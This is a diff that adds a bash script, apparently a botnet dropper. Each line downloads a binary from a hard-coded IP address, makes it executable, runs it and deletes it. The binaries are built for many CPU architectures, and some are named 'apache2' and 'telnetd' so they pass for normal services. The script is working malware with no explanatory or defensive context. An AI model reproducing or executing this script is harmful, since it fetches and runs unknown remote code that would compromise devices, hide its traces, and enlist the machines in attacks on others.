@@ -1,0 +1,14 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.175.22/kyuremmips; chmod +x kyuremmips; ./kyuremmips; rm -rf kyuremmips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.175.22/kyuremmipsel; chmod +x kyuremmipsel; ./kyuremmipsel; rm -rf kyuremmipsel
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.175.22/kyuremsh4; chmod +x kyuremsh4; ./kyuremsh4; rm -rf kyuremsh4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.175.22/kyuremx86; chmod +x kyuremx86; ./kyuremx86; rm -rf kyuremx86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.175.22/kyuremarmv6l; chmod +x kyuremarmv6l; ./kyuremarmv6l; rm -rf kyuremarmv6l
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.175.22/kyuremi686; chmod +x kyuremi686; ./kyuremi686; rm -rf kyuremi686
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.175.22/kyuremppc; chmod +x kyuremppc; ./kyuremppc; rm -rf kyuremppc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.175.22/kyuremi586; chmod +x kyuremi586; ./kyuremi586; rm -rf kyuremi586
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.175.22/kyuremm68k; chmod +x kyuremm68k; ./kyuremm68k; rm -rf kyuremm68k
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.175.22/kyuremsparc; chmod +x kyuremsparc; ./kyuremsparc; rm -rf kyuremsparc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.175.22/' '; chmod +x ' '; ./' '; rm -rf ' '
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.175.22/apache2; chmod +x apache2; ./apache2; rm -rf apache2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.175.22/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
